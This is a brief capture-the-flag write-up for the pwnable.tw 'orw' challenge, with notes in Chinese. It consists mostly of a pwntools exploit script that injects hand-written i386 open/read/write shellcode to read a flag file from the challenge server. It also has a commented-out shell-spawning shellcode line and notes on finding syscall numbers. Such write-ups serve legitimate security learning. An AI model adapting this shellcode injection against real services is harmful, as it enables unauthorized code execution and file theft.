---
title: pwnable.tw
tags:
  - PWN
  - writeup
categories: []
date: 2017-04-23 20:00:03
---

## orw

[汇编中i386的系统调用传参方式](https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm)

exp:
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context(log_level = 'debug')

shellcode = shellcraft.i386.sh()
bss = 0x0804a060
#shellcode = asm(shellcode)
#shellcode = "\x99\x6a\x0b\x58\x60\x59\xcd\x80"
shellcode = 'mov ebx, 0x804a095; mov eax, 5; mov ecx, 0;int 0x80;'
shellcode += 'mov ebx, eax; mov eax, 3; mov ecx, 0x804a095; mov edx, 100; int 0x80;'
shellcode += 'mov edx, 100; mov ebx, 1; mov eax, 4; int 0x80;'
shellcode = asm(shellcode)
print len(shellcode)

shellcode += '/home/orw/flag\x00'
# p = process('./orw')
p = remote('chall.pwnable.tw', 10001)
p.recvuntil(':')
#gdb.attach(p)
p.send(shellcode)
print p.recvall()
```
使用syscall代替int 80出错，原因未知，猜测可能为传参方式不同。

用locate定位系统调用号
```
root@kali ~/c/p/orw# locate unistd_32
/usr/include/x86_64-linux-gnu/asm/unistd_32.h
/usr/lib/x86_64-linux-gnu/perl/5.22.2/asm/unistd_32.ph
/usr/lib/x86_64-linux-gnu/perl/5.24.1/asm/unistd_32.ph
/usr/src/linux-headers-4.9.0-kali3-amd64/arch/x86/include/generated/asm/unistd_32_ia32.h
/usr/src/linux-headers-4.9.0-kali3-amd64/arch/x86/include/generated/uapi/asm/unistd_32.h
/usr/src/linux-headers-4.9.0-kali3-common/arch/sh/include/uapi/asm/unistd_32.h
```